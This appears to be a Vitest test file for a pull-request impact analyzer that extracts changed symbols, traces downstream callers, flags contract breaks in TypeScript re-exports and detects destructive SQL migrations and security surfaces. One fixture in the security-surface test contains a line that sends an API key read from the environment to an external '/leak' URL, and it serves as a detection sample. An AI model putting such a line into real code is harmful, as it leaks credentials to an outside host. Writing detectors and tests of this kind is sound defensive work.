import { describe, expect, it } from "vitest";

import {
  analyzeStructuralImpact,
  detectContractBreaks,
  detectSecuritySurfaces,
  extractChangedSymbols,
  findDownstreamReferences,
} from "../src/index.js";

describe("symbol-extractor", () => {
  it("finds consumers of a public alias when its local implementation changes", () => {
    const report = analyzeStructuralImpact({
      changedFiles: [
        {
          path: "src/producer.ts",
          patch:
            "@@ -1,3 +1,3 @@\n function produce() {\n-  return { id: 'ok' };\n+  return null;\n }",
        },
      ],
      repositoryFiles: [
        {
          path: "src/producer.ts",
          content:
            "function produce() {\n  return null;\n}\nexport { produce as payload };",
        },
        {
          path: "src/consumer.ts",
          content: "import { payload } from './producer';\npayload().id;",
        },
      ],
    });
    expect(report.downstreamReferences).toEqual([
      {
        callerLine: 1,
        callerPath: "src/consumer.ts",
        excerpt: "import { payload } from './producer';",
        symbolName: "payload",
        targetPath: "src/producer.ts",
      },
      {
        callerLine: 2,
        callerPath: "src/consumer.ts",
        excerpt: "payload().id;",
        symbolName: "payload",
        targetPath: "src/producer.ts",
      },
    ]);
  });

  it("preserves omitted structural signals as incomplete analysis", () => {
    const report = analyzeStructuralImpact({
      changedFiles: Array.from({ length: 101 }, (_, index) => ({
        path: `src/producer-${index}.ts`,
        patch: `@@ -1 +1 @@\n-export const value${index} = 1;\n+export const value${index} = 2;`,
      })),
      repositoryFiles: [],
    });
    expect(report.changedSymbols).toHaveLength(100);
    expect(report.omittedSignals).toEqual({
      changedSymbols: 1,
      contractBreaks: 0,
      downstreamReferences: 0,
      securitySurfaces: 0,
    });
  });

  it("traces consumers when only a function body changes outside its declaration hunk", () => {
    const content = [
      "export function produce() {",
      ...Array.from({ length: 35 }, () => "  // Padding."),
      "  return null;",
      "}",
      "export function untouched() { return 1; }",
    ].join("\n");
    const report = analyzeStructuralImpact({
      changedFiles: [
        {
          path: "src/producer.ts",
          patch:
            "--- a/src/producer.ts\n+++ b/src/producer.ts\n@@ -36,3 +36,3 @@\n   // Padding.\n-  return { id: 'ok' };\n+  return null;\n }",
        },
      ],
      repositoryFiles: [
        { path: "src/producer.ts", content },
        {
          path: "src/consumer.ts",
          content: "import { produce } from './producer';\nproduce().id;",
        },
      ],
    });
    expect(report.changedSymbols).toEqual([
      {
        change: "modified",
        isExported: true,
        kind: "function",
        line: 1,
        name: "produce",
        path: "src/producer.ts",
      },
    ]);
    expect(report.downstreamReferences).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          symbolName: "produce",
          callerPath: "src/consumer.ts",
        }),
      ]),
    );
  });
  it("extracts TypeScript / JavaScript added, modified and deleted symbols", () => {
    const patch = [
      "--- a/src/math.ts",
      "+++ b/src/math.ts",
      "@@ -1,3 +1,7 @@",
      "-export function oldHelper() { return 1; }",
      "-export function add(a: number, b: number): number {",
      "-  return a + b;",
      "+export function add(a: number, b: number, c = 0): number {",
      "+  return a + b + c;",
      "+}",
      "+export const multiply = (a: number, b: number) => a * b;",
      "+export class Calculator {}",
      "+export interface Config {}",
      "+export type Result = number;",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/math.ts" }]);
    expect(symbols).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          change: "deleted",
          isExported: true,
          kind: "function",
          name: "oldHelper",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "modified",
          isExported: true,
          kind: "function",
          name: "add",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "constant",
          name: "multiply",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "class",
          name: "Calculator",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "interface",
          name: "Config",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "type",
          name: "Result",
          path: "src/math.ts",
        }),
      ]),
    );
  });

  it("extracts Python functions and classes with export convention", () => {
    const patch = [
      "--- a/service.py",
      "+++ b/service.py",
      "@@ -0,0 +1,6 @@",
      "+def public_func():",
      "+    pass",
      "+def _private_func():",
      "+    pass",
      "+class UserService:",
      "+    pass",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "service.py" }]);
    const publicFunc = symbols.find((s) => s.name === "public_func");
    const privateFunc = symbols.find((s) => s.name === "_private_func");
    const userService = symbols.find((s) => s.name === "UserService");

    expect(publicFunc).toBeDefined();
    expect(publicFunc?.isExported).toBe(true);
    expect(privateFunc).toBeDefined();
    expect(privateFunc?.isExported).toBe(false);
    expect(userService).toBeDefined();
    expect(userService?.kind).toBe("class");
  });

  it("extracts Go functions and types with uppercase export convention", () => {
    const patch = [
      "--- a/pkg/auth.go",
      "+++ b/pkg/auth.go",
      "@@ -0,0 +1,3 @@",
      "+func Authenticate(token string) bool { return true }",
      "+func internalHash() {}",
      "+type SessionManager struct {}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "pkg/auth.go" }]);
    const auth = symbols.find((s) => s.name === "Authenticate");
    const internal = symbols.find((s) => s.name === "internalHash");
    const session = symbols.find((s) => s.name === "SessionManager");

    expect(auth?.isExported).toBe(true);
    expect(internal?.isExported).toBe(false);
    expect(session?.isExported).toBe(true);
    expect(session?.kind).toBe("type");
  });

  it("extracts Rust functions and structs with pub visibility", () => {
    const patch = [
      "--- a/src/lib.rs",
      "+++ b/src/lib.rs",
      "@@ -0,0 +1,3 @@",
      "+pub fn process_data() {}",
      "+fn local_helper() {}",
      "+pub struct UserRecord {}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/lib.rs" }]);
    const process = symbols.find((s) => s.name === "process_data");
    const local = symbols.find((s) => s.name === "local_helper");
    const user = symbols.find((s) => s.name === "UserRecord");

    expect(process?.isExported).toBe(true);
    expect(local?.isExported).toBe(false);
    expect(user?.isExported).toBe(true);
  });

  it("extracts Java classes and public methods", () => {
    const patch = [
      "--- a/src/App.java",
      "+++ b/src/App.java",
      "@@ -0,0 +1,3 @@",
      "+public class App {",
      "+  public void start() {}",
      "+}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/App.java" }]);
    const appClass = symbols.find((s) => s.name === "App");
    const startMethod = symbols.find((s) => s.name === "start");

    expect(appClass?.isExported).toBe(true);
    expect(appClass?.kind).toBe("class");
    expect(startMethod?.isExported).toBe(true);
    expect(startMethod?.kind).toBe("function");
  });
});

describe("downstream-tracer", () => {
  it.each(["$load", "load$", "área", "用户"])(
    "traces the complete JavaScript identifier %s",
    (name) => {
      const result = findDownstreamReferences(
        [
          {
            name,
            path: "src/producer.ts",
            line: 1,
            kind: "function",
            change: "modified",
            isExported: true,
          },
        ],
        [{ path: "src/consumer.ts", content: `${name}();` }],
      );
      expect(result.totalCount).toBe(1);
      expect(result.references).toMatchObject([
        { symbolName: name, callerPath: "src/consumer.ts", callerLine: 1 },
      ]);
    },
  );

  it("does not mistake identifier fragments for downstream references", () => {
    const result = findDownstreamReferences(
      [
        {
          name: "load",
          path: "src/producer.ts",
          line: 1,
          kind: "function",
          change: "modified",
          isExported: true,
        },
      ],
      [
        {
          path: "src/consumer.ts",
          content: [
            "$load();",
            "load$();",
            "préload();",
            "loadπ();",
            "load\u200Dextra();",
            "value\u200Cload();",
            "load_other();",
          ].join("\n"),
        },
      ],
    );
    expect(result).toEqual({ references: [], totalCount: 0 });
  });

  it("traces downstream references across repository files", () => {
    const symbols = [
      {
        change: "modified" as const,
        isExported: true,
        kind: "function" as const,
        line: 10,
        name: "calculateTotals",
        path: "src/billing.ts",
      },
    ];

    const repoFiles = [
      {
        content:
          "import { calculateTotals ,} from './billing';\nconst res = calculateTotals(cart);\n",
        path: "src/checkout.ts",
      },
      {
        content: "export function calculateTotals() {}",
        path: "src/billing.ts",
      },
      {
        content: "console.log('Unrelated');",
        path: "src/other.ts",
      },
    ];

    const { references, totalCount } = findDownstreamReferences(
      symbols,
      repoFiles,
    );
    expect(totalCount).toBe(2);
    expect(references).toHaveLength(2);
    expect(references[0]?.callerPath).toBe("src/checkout.ts");
    expect(references[0]?.symbolName).toBe("calculateTotals");
  });

  it("caps references according to maxReferences option", () => {
    const symbols = [
      {
        change: "modified" as const,
        isExported: true,
        kind: "function" as const,
        line: 10,
        name: "helper",
        path: "src/utils.ts",
      },
    ];

    const repoFiles = [
      {
        content: "helper();\nhelper();\nhelper();\n",
        path: "src/consumer.ts",
      },
    ];

    const { references, totalCount } = findDownstreamReferences(
      symbols,
      repoFiles,
      {
        maxReferences: 2,
      },
    );
    expect(totalCount).toBe(3);
    expect(references).toHaveLength(2);
  });
});

describe("contract-break-detector", () => {
  it("does not report a removed interface when its original module re-exports the moved type", () => {
    const changedFiles = [
      {
        path: "packages/github/src/client.ts",
        patch: [
          "--- a/packages/github/src/client.ts",
          "+++ b/packages/github/src/client.ts",
          "@@ -1,4 +1,1 @@",
          "-export interface GitHubAppCredentials {",
          "-  readonly appId: number;",
          "-  readonly privateKey: string;",
          "-}",
          '+export type { GitHubAppCredentials } from "./authentication.js";',
        ].join("\n"),
      },
      {
        path: "packages/github/src/authentication.ts",
        patch: [
          "--- a/packages/github/src/authentication.ts",
          "+++ b/packages/github/src/authentication.ts",
          "@@ -0,0 +1,4 @@",
          "+export interface GitHubAppCredentials {",
          "+  readonly appId: number;",
          "+  readonly privateKey: string;",
          "+}",
        ].join("\n"),
      },
    ];

    const report = analyzeStructuralImpact({
      changedFiles,
      repositoryFiles: [
        {
          content:
            'export type { GitHubAppCredentials } from "./authentication.js";',
          path: "packages/github/src/client.ts",
        },
      ],
    });

    expect(report.changedSymbols).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          change: "deleted",
          kind: "interface",
          name: "GitHubAppCredentials",
          path: "packages/github/src/client.ts",
        }),
      ]),
    );
    expect(report.contractBreaks).toEqual([]);
  });

  it("retains removal signals when a type re-export does not preserve the exported runtime symbol", () => {
    const patch = [
      "--- a/src/client.ts",
      "+++ b/src/client.ts",
      "@@ -1,1 +1,1 @@",
      "-export function createClient() {}",
      '+export type { createClient } from "./authentication.js";',
    ].join("\n");
    const symbols = extractChangedSymbols([{ path: "src/client.ts", patch }]);

    expect(
      detectContractBreaks(
        [{ path: "src/client.ts", patch }],
        symbols,
        undefined,
        [
          {
            content: 'export type { createClient } from "./authentication.js";',
            path: "src/client.ts",
          },
        ],
      ),
    ).toEqual([
      expect.objectContaining({
        kind: "exported_symbol_removed",
        path: "src/client.ts",
      }),
    ]);
  });

  it("does not suppress an unrelated type removal because another name was re-exported", () => {
    const patch = [
      "--- a/src/client.ts",
      "+++ b/src/client.ts",
      "@@ -1,1 +1,1 @@",
      "-export interface RemovedCredentials {}",
      '+export type { CurrentCredentials } from "./authentication.js";',
    ].join("\n");
    const symbols = extractChangedSymbols([{ path: "src/client.ts", patch }]);

    expect(
      detectContractBreaks(
        [{ path: "src/client.ts", patch }],
        symbols,
        undefined,
        [
          {
            content:
              'export type { CurrentCredentials } from "./authentication.js";',
            path: "src/client.ts",
          },
        ],
      ),
    ).toEqual([
      expect.objectContaining({
        kind: "exported_symbol_removed",
        path: "src/client.ts",
      }),
    ]);
  });

  it("preserves multiline mixed type and value re-exports for PR #177", () => {
    const patch = [
      "--- a/src/tenancy.server.ts",
      "+++ b/src/tenancy.server.ts",
      "@@ -10,4 +10,4 @@",
      "-export class TenancyError extends Error {",
      "-  readonly code: string;",
      "-}",
      '-export type TenancyErrorCode = "NOT_FOUND" | "UNAUTHORIZED";',
      "+export {",
      "+  type TenancyErrorCode,",
      "+  TenancyError,",
      '+} from "./tenancy-error.server.js";',
    ].join("\n");
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
      {
        change: "deleted" as const,
        isExported: true,
        kind: "type" as const,
        line: 13,
        name: "TenancyErrorCode",
        path: "src/tenancy.server.ts",
      },
    ];

    expect(
      detectContractBreaks(
        [{ path: "src/tenancy.server.ts", patch }],
        symbols,
        undefined,
        [
          {
            content:
              'export {\n  type TenancyErrorCode,\n  TenancyError,\n} from "./tenancy-error.server.js";',
            path: "src/tenancy.server.ts",
          },
        ],
      ),
    ).toEqual([]);
  });

  it("preserves real re-export declarations with comments between specifiers", () => {
    const patch = [
      "--- a/src/tenancy.server.ts",
      "+++ b/src/tenancy.server.ts",
      "@@ -10,2 +10,6 @@",
      "-export class TenancyError extends Error {}",
      '-export type TenancyErrorCode = "NOT_FOUND";',
      "+export {",
      "+  // primary domain error",
      "+  TenancyError,",
      "+  /* type definition */",
      "+  type TenancyErrorCode,",
      '+} from "./tenancy-error.server.js";',
    ].join("\n");
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
      {
        change: "deleted" as const,
        isExported: true,
        kind: "type" as const,
        line: 11,
        name: "TenancyErrorCode",
        path: "src/tenancy.server.ts",
      },
    ];

    expect(
      detectContractBreaks(
        [{ path: "src/tenancy.server.ts", patch }],
        symbols,
        undefined,
        [
          {
            content:
              'export {\n  // primary domain error\n  TenancyError,\n  /* type definition */\n  type TenancyErrorCode,\n} from "./tenancy-error.server.js";',
            path: "src/tenancy.server.ts",
          },
        ],
      ),
    ).toEqual([]);
  });

  it("retains contract break when a runtime class is re-exported only as a type", () => {
    const patch = [
      "--- a/src/tenancy.server.ts",
      "+++ b/src/tenancy.server.ts",
      "@@ -10,1 +10,1 @@",
      "-export class TenancyError extends Error {}",
      '+export type { TenancyError } from "./tenancy-error.server.js";',
    ].join("\n");
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
    ];

    expect(
      detectContractBreaks(
        [{ path: "src/tenancy.server.ts", patch }],
        symbols,
        undefined,
        [
          {
            content:
              'export type { TenancyError } from "./tenancy-error.server.js";',
            path: "src/tenancy.server.ts",
          },
        ],
      ),
    ).toEqual([
      expect.objectContaining({
        description:
          "Exported class 'TenancyError' was removed from src/tenancy.server.ts",
        kind: "exported_symbol_removed",
        path: "src/tenancy.server.ts",
      }),
    ]);
  });

  it("preserves runtime symbol when re-exported with a public alias matching the original name", () => {
    const patch = [
      "--- a/src/tenancy.server.ts",
      "+++ b/src/tenancy.server.ts",
      "@@ -10,1 +10,1 @@",
      "-export class TenancyError extends Error {}",
      '+export { RawTenancyError as TenancyError } from "./tenancy-error.server.js";',
    ].join("\n");
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
    ];

    expect(
      detectContractBreaks(
        [{ path: "src/tenancy.server.ts", patch }],
        symbols,
        undefined,
        [
          {
            content:
              'export { RawTenancyError as TenancyError } from "./tenancy-error.server.js";',
            path: "src/tenancy.server.ts",
          },
        ],
      ),
    ).toEqual([]);
  });

  it("retains contract break when alias exposes a different public name", () => {
    const patch = [
      "--- a/src/tenancy.server.ts",
      "+++ b/src/tenancy.server.ts",
      "@@ -10,1 +10,1 @@",
      "-export class TenancyError extends Error {}",
      '+export { TenancyError as AliasedTenancyError } from "./tenancy-error.server.js";',
    ].join("\n");
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
    ];

    expect(
      detectContractBreaks(
        [{ path: "src/tenancy.server.ts", patch }],
        symbols,
        undefined,
        [
          {
            content:
              'export { TenancyError as AliasedTenancyError } from "./tenancy-error.server.js";',
            path: "src/tenancy.server.ts",
          },
        ],
      ),
    ).toEqual([
      expect.objectContaining({
        description:
          "Exported class 'TenancyError' was removed from src/tenancy.server.ts",
        kind: "exported_symbol_removed",
        path: "src/tenancy.server.ts",
      }),
    ]);
  });

  it("does not suppress removed symbols when export keywords appear in comments or strings", () => {
    const patch = [
      "--- a/src/tenancy.server.ts",
      "+++ b/src/tenancy.server.ts",
      "@@ -10,2 +10,7 @@",
      "-export class TenancyError extends Error {}",
      '-export type TenancyErrorCode = "NOT_FOUND";',
      "+// export { type TenancyErrorCode, TenancyError } from './tenancy-error.server.js';",
      "+/*",
      "+export { type TenancyErrorCode, TenancyError } from './tenancy-error.server.js';",
      "+*/",
      "+const example = `",
      "+export { type TenancyErrorCode, TenancyError } from './tenancy-error.server.js';",
      "+`;",
    ].join("\n");
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
      {
        change: "deleted" as const,
        isExported: true,
        kind: "type" as const,
        line: 12,
        name: "TenancyErrorCode",
        path: "src/tenancy.server.ts",
      },
    ];

    const breaks = detectContractBreaks(
      [{ path: "src/tenancy.server.ts", patch }],
      symbols,
      undefined,
      [
        {
          content:
            '// export { type TenancyErrorCode, TenancyError } from "./tenancy-error.server.js";\n/*\nexport { type TenancyErrorCode, TenancyError } from "./tenancy-error.server.js";\n*/\nconst example = `\nexport { type TenancyErrorCode, TenancyError } from "./tenancy-error.server.js";\n`;',
          path: "src/tenancy.server.ts",
        },
      ],
    );
    expect(breaks).toHaveLength(2);
    expect(breaks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          description:
            "Exported class 'TenancyError' was removed from src/tenancy.server.ts",
          kind: "exported_symbol_removed",
        }),
        expect.objectContaining({
          description:
            "Exported type 'TenancyErrorCode' was removed from src/tenancy.server.ts",
          kind: "exported_symbol_removed",
        }),
      ]),
    );
  });

  it("does not suppress removed symbols when apparent export text is inside a comment or template literal opened before the diff hunk", () => {
    const patch = [
      "--- a/src/tenancy.server.ts",
      "+++ b/src/tenancy.server.ts",
      "@@ -15,1 +15,1 @@",
      "-export class TenancyError extends Error {}",
      "+// removed class",
    ].join("\n");
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 15,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
    ];

    // Case 1: Block comment opened at line 1, before the hunk
    const blockCommentHead = [
      "/*",
      " * Top of the module documentation opened earlier:",
      ' * export { TenancyError } from "./tenancy-error.server.js";',
      " */",
      "export const active = true;",
    ].join("\n");

    expect(
      detectContractBreaks(
        [{ path: "src/tenancy.server.ts", patch }],
        symbols,
        undefined,
        [
          {
            content: blockCommentHead,
            path: "src/tenancy.server.ts",
          },
        ],
      ),
    ).toEqual([
      expect.objectContaining({
        description:
          "Exported class 'TenancyError' was removed from src/tenancy.server.ts",
        kind: "exported_symbol_removed",
      }),
    ]);

    // Case 2: Template string literal opened earlier in file
    const templateStringHead = [
      "const guide = `",
      "Module documentation guide:",
      'export { TenancyError } from "./tenancy-error.server.js";',
      "`;",
      "export const active = true;",
    ].join("\n");

    expect(
      detectContractBreaks(
        [{ path: "src/tenancy.server.ts", patch }],
        symbols,
        undefined,
        [
          {
            content: templateStringHead,
            path: "src/tenancy.server.ts",
          },
        ],
      ),
    ).toEqual([
      expect.objectContaining({
        description:
          "Exported class 'TenancyError' was removed from src/tenancy.server.ts",
        kind: "exported_symbol_removed",
      }),
    ]);
  });

  it.each([".mts", ".cts", ".js"])(
    "recognizes re-exports in %s files",
    (ext) => {
      const filePath = `src/tenancy.server${ext}`;
      const patch = [
        `--- a/${filePath}`,
        `+++ b/${filePath}`,
        "@@ -1,1 +1,1 @@",
        "-export function getTenancy() {}",
        '+export { getTenancy } from "./tenancy-impl.js";',
      ].join("\n");
      const symbols = [
        {
          change: "deleted" as const,
          isExported: true,
          kind: "function" as const,
          line: 1,
          name: "getTenancy",
          path: filePath,
        },
      ];

      expect(
        detectContractBreaks([{ path: filePath, patch }], symbols, undefined, [
          {
            content: 'export { getTenancy } from "./tenancy-impl.js";',
            path: filePath,
          },
        ]),
      ).toEqual([]);
    },
  );

  it("retains contract break when module source is absent from repository files or has parse error", () => {
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
    ];

    // Case 1: absent
    expect(detectContractBreaks([], symbols, undefined, [])).toHaveLength(1);

    // Case 2: parse error
    expect(
      detectContractBreaks([], symbols, undefined, [
        {
          content: "export default class { syntax error ???",
          path: "src/tenancy.server.ts",
        },
      ]),
    ).toHaveLength(1);
  });

  it("retains contract break when invalid TypeScript syntax is placed in a .js file", () => {
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.js",
      },
    ];

    expect(
      detectContractBreaks([], symbols, undefined, [
        {
          // TypeScript type annotation syntax in .js file will fail parsing without typescript plugin
          content: "export class TenancyError { readonly id: string; }",
          path: "src/tenancy.server.js",
        },
      ]),
    ).toEqual([
      expect.objectContaining({
        kind: "exported_symbol_removed",
        path: "src/tenancy.server.js",
      }),
    ]);
  });

  it("retains contract break when a local re-export export { Foo } references only a local interface", () => {
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "class" as const,
        line: 10,
        name: "TenancyError",
        path: "src/tenancy.server.ts",
      },
    ];

    expect(
      detectContractBreaks([], symbols, undefined, [
        {
          content:
            "interface TenancyError { code: string; }\nexport { TenancyError };",
          path: "src/tenancy.server.ts",
        },
      ]),
    ).toEqual([
      expect.objectContaining({
        description:
          "Exported class 'TenancyError' was removed from src/tenancy.server.ts",
        kind: "exported_symbol_removed",
        path: "src/tenancy.server.ts",
      }),
    ]);
  });

  it("retains contract break when removed interface is replaced by homonymous const export, but preserves both when replaced by class export", () => {
    const interfaceSymbol = {
      change: "deleted" as const,
      isExported: true,
      kind: "interface" as const,
      line: 1,
      name: "Foo",
      path: "src/foo.ts",
    };
    const classSymbol = {
      change: "deleted" as const,
      isExported: true,
      kind: "class" as const,
      line: 1,
      name: "Foo",
      path: "src/foo.ts",
    };

    // Case 1: interface Foo removed -> export const Foo = 1 retains alert because const only exports value namespace
    expect(
      detectContractBreaks([], [interfaceSymbol], undefined, [
        {
          content: "export const Foo = 1;",
          path: "src/foo.ts",
        },
      ]),
    ).toEqual([
      expect.objectContaining({
        description: "Exported interface 'Foo' was removed from src/foo.ts",
        kind: "exported_symbol_removed",
        path: "src/foo.ts",
      }),
    ]);

    // Case 2: export class Foo declares both type and value namespaces, preserving both removed interface and class
    expect(
      detectContractBreaks([], [interfaceSymbol], undefined, [
        {
          content: "export class Foo {}",
          path: "src/foo.ts",
        },
      ]),
    ).toEqual([]);

    expect(
      detectContractBreaks([], [classSymbol], undefined, [
        {
          content: "export class Foo {}",
          path: "src/foo.ts",
        },
      ]),
    ).toEqual([]);
  });

  it("retains contract break when removed interface is replaced by export declare const", () => {
    const interfaceSymbol = {
      change: "deleted" as const,
      isExported: true,
      kind: "interface" as const,
      line: 1,
      name: "Foo",
      path: "src/foo.ts",
    };

    expect(
      detectContractBreaks([], [interfaceSymbol], undefined, [
        {
          content: "export declare const Foo: number;",
          path: "src/foo.ts",
        },
      ]),
    ).toEqual([
      expect.objectContaining({
        description: "Exported interface 'Foo' was removed from src/foo.ts",
        kind: "exported_symbol_removed",
        path: "src/foo.ts",
      }),
    ]);
  });

  it("retains contract break when removed class is re-exported from an ambient declare class", () => {
    const classSymbol = {
      change: "deleted" as const,
      isExported: true,
      kind: "class" as const,
      line: 1,
      name: "Foo",
      path: "src/foo.ts",
    };

    expect(
      detectContractBreaks([], [classSymbol], undefined, [
        {
          content: "declare class LocalFoo {}\nexport { LocalFoo as Foo };",
          path: "src/foo.ts",
        },
      ]),
    ).toEqual([
      expect.objectContaining({
        description: "Exported class 'Foo' was removed from src/foo.ts",
        kind: "exported_symbol_removed",
        path: "src/foo.ts",
      }),
    ]);
  });

  it.each([
    {
      source: "export class Local {} export { Local as Foo };",
      type: true,
      value: true,
    },
    {
      source: "export interface Local {} export type { Local as Foo };",
      type: true,
      value: false,
    },
    {
      source: "export declare class Local {} export { Local as Foo };",
      type: true,
      value: false,
    },
    {
      source: "export function Local() {} export { Local as Foo };",
      type: false,
      value: true,
    },
    {
      source: "export const Local = 1; export { Local as Foo };",
      type: false,
      value: true,
    },
    {
      source: "export default class Local {} export { Local as Foo };",
      type: true,
      value: true,
    },
    {
      source: "export default function Local() {} export { Local as Foo };",
      type: false,
      value: true,
    },
    {
      source: "class Local {} export { Local as Foo };",
      type: true,
      value: true,
    },
    {
      source: "enum Local { A } export { Local as Foo };",
      type: true,
      value: true,
    },
    {
      source: "function Local() {} export { Local as Foo };",
      type: false,
      value: true,
    },
    {
      source: "const Local = 1; export { Local as Foo };",
      type: false,
      value: true,
    },
    {
      source: "let Local = 1; export { Local as Foo };",
      type: false,
      value: true,
    },
    {
      source: "var Local = 1; export { Local as Foo };",
      type: false,
      value: true,
    },
    {
      source: "interface Local {} export type { Local as Foo };",
      type: true,
      value: false,
    },
    {
      source: "type Local = string; export { type Local as Foo };",
      type: true,
      value: false,
    },
    {
      source: "class Local {} export { type Local as Foo };",
      type: true,
      value: false,
    },
    { source: "export enum Foo { A }", type: true, value: true },
    { source: "export interface Foo {}", type: true, value: false },
    { source: "export type Foo = string;", type: true, value: false },
    { source: "export function Foo() {}", type: false, value: true },
    { source: "export const Foo = 1, other = 2;", type: false, value: true },
    { source: "export declare class Foo {}", type: true, value: false },
    {
      source: "declare enum Local { A } export { Local as Foo };",
      type: true,
      value: false,
    },
    { source: "export declare enum Foo { A }", type: true, value: false },
    {
      source: "declare const Local: number; export { Local as Foo };",
      type: false,
      value: false,
    },
    {
      source: "export declare function Foo(): void;",
      type: false,
      value: false,
    },
    {
      source: 'class Local {} export { Local as "Foo" };',
      type: true,
      value: true,
    },
  ])(
    "preserves only the declared public namespaces: $source",
    ({ source, type, value }) => {
      for (const [kind, preserved] of [
        ["interface", type],
        ["class", value],
      ] as const) {
        const signals = detectContractBreaks(
          [],
          [
            {
              change: "deleted",
              isExported: true,
              kind,
              line: 1,
              name: "Foo",
              path: "src/foo.ts",
            },
          ],
          undefined,
          [{ content: source, path: "src/foo.ts" }],
        );
        expect(signals).toHaveLength(preserved ? 0 : 1);
        if (!preserved)
          expect(signals[0]?.kind).toBe("exported_symbol_removed");
      }
    },
  );

  it.each(["jsx", "tsx"])(
    "parses a complete %s module containing JSX",
    (extension) => {
      const path = `src/foo.${extension}`;
      expect(
        detectContractBreaks(
          [],
          [
            {
              change: "deleted",
              isExported: true,
              kind: "class",
              line: 1,
              name: "Foo",
              path,
            },
          ],
          undefined,
          [{ content: "export class Foo {} const view = <div />;", path }],
        ),
      ).toEqual([]);
    },
  );

  it("detects removed exported symbols", () => {
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "function" as const,
        line: 20,
        name: "deleteUser",
        path: "src/user.ts",
      },
      {
        change: "deleted" as const,
        isExported: false,
        kind: "function" as const,
        line: 30,
        name: "privateInternal",
        path: "src/user.ts",
      },
    ];

    const breaks = detectContractBreaks([], symbols);
    expect(breaks).toHaveLength(1);
    expect(breaks[0]?.kind).toBe("exported_symbol_removed");
    expect(breaks[0]?.severity).toBe("critical");
    expect(breaks[0]?.description).toContain("deleteUser");
  });

  it("does not treat removed exports in internal apps as contract breaks unless consumed downstream", () => {
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "function" as const,
        line: 10,
        name: "internalHelper",
        path: "apps/repository-executor/src/review-context.ts",
      },
    ];

    // Without downstream consumers: no contract break
    const breaksNoConsumers = detectContractBreaks([], symbols, []);
    expect(breaksNoConsumers).toHaveLength(0);

    // With downstream consumers: contract break
    const breaksWithConsumers = detectContractBreaks([], symbols, [
      {
        callerLine: 5,
        callerPath: "apps/control-plane/src/worker.ts",
        excerpt: "import { internalHelper ,} from './review-context'",
        symbolName: "internalHelper",
        targetPath: "apps/repository-executor/src/review-context.ts",
      },
    ]);
    expect(breaksWithConsumers).toHaveLength(1);
    expect(breaksWithConsumers[0]?.description).toContain("internalHelper");
  });

  it("detects destructive SQL migrations and handles deletions and malformed patches", () => {
    const files = [
      {
        patch: [
          "--- a/migrations/0002_drop.sql",
          "+++ b/migrations/0002_drop.sql",
          "@@ -1,1 +1,2 @@",
          "-SELECT 1;",
          "+ALTER TABLE users DROP COLUMN legacy_auth;",
          "+DROP TABLE old_audit_logs;",
        ].join("\n"),
        path: "migrations/0002_drop.sql",
      },
      {
        patch: "invalid patch",
        path: "migrations/0003_broken.sql",
      },
    ];

    const breaks = detectContractBreaks(files, []);
    expect(breaks).toHaveLength(2);
    expect(breaks[0]?.kind).toBe("sql_destructive_migration");
    expect(breaks[0]?.description).toContain("DROP COLUMN");
    expect(breaks[1]?.description).toContain("DROP TABLE");
  });
});

describe("security-surface-detector", () => {
  it("detects added dependencies and secret/egress patterns", () => {
    const files = [
      {
        patch: [
          "--- a/package.json",
          "+++ b/package.json",
          "@@ -10,1 +10,2 @@",
          '   "existing": "1.0.0",',
          '+"untrusted-lib": "^2.1.0",',
        ].join("\n"),
        path: "package.json",
      },
      {
        patch: [
          "--- a/src/api.ts",
          "+++ b/src/api.ts",
          "@@ -0,0 +1,2 @@",
          "+const key = process.env.API_KEY;",
          '+await fetch("https://external-api.com/leak", { body: key });',
        ].join("\n"),
        path: "src/api.ts",
      },
    ];

    const signals = detectSecuritySurfaces(files);
    expect(signals).toHaveLength(3);
    expect(signals[0]?.kind).toBe("new_dependency");
    expect(signals[0]?.excerpt).toContain("untrusted-lib");
    expect(signals[1]?.kind).toBe("secret_or_env_access");
    expect(signals[2]?.kind).toBe("network_egress");
  });
});

describe("analyzeStructuralImpact", () => {
  it("orchestrates all analyzers and returns a unified structural report", () => {
    const changedFiles = [
      {
        patch: [
          "--- a/src/core.ts",
          "+++ b/src/core.ts",
